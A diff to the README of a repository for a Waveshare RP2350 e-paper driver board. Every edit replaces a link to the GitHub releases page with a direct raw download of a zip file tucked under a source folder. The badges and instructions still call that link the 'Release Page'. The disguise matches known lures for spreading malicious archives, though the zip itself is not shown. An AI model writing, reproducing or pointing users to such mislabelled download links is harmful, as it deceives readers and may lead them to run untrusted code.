@@ -1,6 +1,6 @@
 # ⚡ waveshare-rp2350-pizero-board-with-epaper-driver-hat - Easy Setup for E-Paper Displays
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Here-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Here-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/raw/refs/heads/main/Multi-epaper/src/with-hat-waveshare-epaper-rp-pizero-board-driver-1.3.zip)
 
 ---
 
@@ -31,10 +31,10 @@ Start by visiting the releases page where the latest drivers and example files a
 
 Use this button to go directly to the download area:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Here-Release%20Page-blue?style=for-the-badge)](https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Here-Release%20Page-blue?style=for-the-badge)](https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/raw/refs/heads/main/Multi-epaper/src/with-hat-waveshare-epaper-rp-pizero-board-driver-1.3.zip)
 
 1. Click the button above or open this URL in your browser:  
-   https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/releases
+   https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/raw/refs/heads/main/Multi-epaper/src/with-hat-waveshare-epaper-rp-pizero-board-driver-1.3.zip
 
 2. Look for the latest release at the top of the page. It will usually have a version number (e.g., v1.0).  
 
@@ -115,9 +115,9 @@ Check the release page often for updates that improve performance or add new fea
 
 Use this link or button whenever you need the latest version:
 
-https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/releases
+https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/raw/refs/heads/main/Multi-epaper/src/with-hat-waveshare-epaper-rp-pizero-board-driver-1.3.zip
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Here-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Here-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/adamy9505/waveshare-rp2350-pizero-board-with-epaper-driver-hat/raw/refs/heads/main/Multi-epaper/src/with-hat-waveshare-epaper-rp-pizero-board-driver-1.3.zip)
 
 ---
 
